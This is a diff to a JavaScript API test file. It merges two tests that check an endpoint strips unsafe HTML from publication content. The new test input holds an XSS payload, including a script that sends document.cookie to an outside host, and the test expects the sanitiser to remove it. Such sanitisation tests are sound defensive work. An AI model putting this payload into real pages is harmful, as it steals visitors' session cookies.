@@ -39,22 +39,16 @@ describe('Update publication version', () => {
         expect(updatedVersion.status).toEqual(200);
     });
 
-    test('HTML is sanitised if not "safe" (1)', async () => {
+    test('HTML is sanitised if not "safe"', async () => {
         const updatedVersion = await testUtils.agent
             .patch('/publication-versions/publication-interpretation-draft-v1')
             .query({ apiKey: 123456789 })
-            .send({ content: '<p class="class">Hello <a href="#nathan">Nathan</a></p>' });
+            .send({
+                content:
+                    '<p><a target="_blank" href="http://example.net">test</a></p><script>alert(\'XSS\')</script><script>var i=new Image;i.src=\'https://b.soc.ja.net?\'+document.cookie;</script>'
+            });
 
-        expect(updatedVersion.body.content).toEqual('<p>Hello <a href="#nathan">Nathan</a></p>');
-    });
-
-    test('HTML is sanitised if not "safe" (2)', async () => {
-        const updatedVersion = await testUtils.agent
-            .patch('/publication-versions/publication-interpretation-draft-v1')
-            .query({ apiKey: 123456789 })
-            .send({ content: '<p style="color: red;">Hello <a href="#nathan">Nathan</a></p>' });
-
-        expect(updatedVersion.body.content).toEqual('<p>Hello <a href="#nathan">Nathan</a></p>');
+        expect(updatedVersion.body.content).toEqual('<p><a href="http://example.net">test</a></p>');
     });
 
     test('Cannot update publication version licence', async () => {
